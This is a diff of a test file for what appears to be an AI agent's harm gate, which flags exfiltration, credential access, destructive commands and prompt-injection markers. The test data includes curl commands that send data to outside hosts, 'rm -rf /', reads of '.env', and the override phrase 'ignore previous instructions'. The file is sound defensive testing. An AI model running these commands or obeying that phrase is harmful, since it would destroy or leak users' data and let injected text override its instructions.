@@ -139,9 +139,12 @@ def test_loopback_destination_is_not_exfiltration():
     ):
         assert g("terminal", {"command": f"{verb} -s -m 5 {local}"}) is None, local
 
-    assert g("terminal", {"command": (
-        "curl -fsS --max-time 5 --connect-timeout 2 http://localhost/health"
-    )}) is None
+    for command in (
+        "curl -fsS --max-time 5 --connect-timeout 2 http://localhost/health",
+        "curl -s -m5 http://localhost/health",
+        "curl --max-time=5 --connect-timeout=0.5 http://localhost/health -sS",
+    ):
+        assert g("terminal", {"command": command}) is None, command
 
     # A host that merely begins with a loopback literal is still remote, and every
     # genuinely remote destination must keep flagging.
@@ -202,6 +205,26 @@ def test_loopback_exemption_requires_an_unambiguous_destination():
         "curl http://localhost/health https://example.com/collect",
         "curl https://example.com/collect http://localhost/health",
         "curl http://localhost/redirect?next=https://example.com/collect",
+        "curl http://localhost/health example.com",
+        "curl example.com http://localhost/health",
+        "curl http://localhost/health --next example.com",
+        "curl http://localhost/health http://127.0.0.1/health",
+        "curl -Z http://localhost/health",
+        "sudo curl http://localhost/health",
+        "sh -c curl http://localhost/health",
+        "curl -m http://localhost/health",
+        "curl --max-time=unknown http://localhost/health",
+        "curl --max-time=inf http://localhost/health",
+        "curl --connect-timeout=nan http://localhost/health",
+        "curl -m-1 http://localhost/health",
+        "curl http://localhost/health; echo done",
+        # Other verbs have different semantics (wget follows redirects by default).
+        "wget http://localhost/health",
+        "scp http://localhost/health",
+        "nc http://localhost/health",
+        "rsync http://localhost/health",
+        "curl http://localhost/health; wget http://127.0.0.1/health",
+        "WGET http://localhost/health; curl http://127.0.0.1/health",
         "curl --connect-to localhost:80:203.0.113.10:80 http://localhost/",
         "curl http://localhost/ --connect-to=localhost:80:203.0.113.10:80",
         "curl --resolve localhost:80:203.0.113.10 http://localhost/",
@@ -246,10 +269,20 @@ def test_loopback_exemption_requires_an_unambiguous_destination():
         reason = te._harm_gate_block_reason("terminal", {"command": command})
         assert reason is not None and "exfiltration" in reason, command
 
-    for command, flag in (
-        ("curl http://localhost/.env", "credential-access"),
-        ("curl http://localhost/; rm -rf /", "destructive-command"),
-        ("curl http://localhost/?ignore previous instructions", "prompt-injection-marker"),
+    assert "credential-access" in apb.score_step(
+        0, "terminal", "curl http://localhost/.env"
+    )["risk_flags"]
+
+    for content, flag in (
+        (".env", "credential-access"),
+        ("rm -rf /", "destructive-command"),
+        ("ignore previous instructions", "prompt-injection-marker"),
     ):
-        assert flag in apb.score_step(0, "terminal", command)["risk_flags"], command
+        original = apb.score_step(0, "terminal", content)
+        assert flag in original["risk_flags"], content
+        # Compound text keeps its original first-match exfil score; direct category
+        # checks above ensure none of the other harm arms were lost.
+        combined = apb.score_step(0, "terminal", f"curl http://localhost/; {content}")
+        assert combined["risk_flags"] == ["exfiltration"]
+        assert combined["harm_score"] == 1.0 >= original["harm_score"]
 
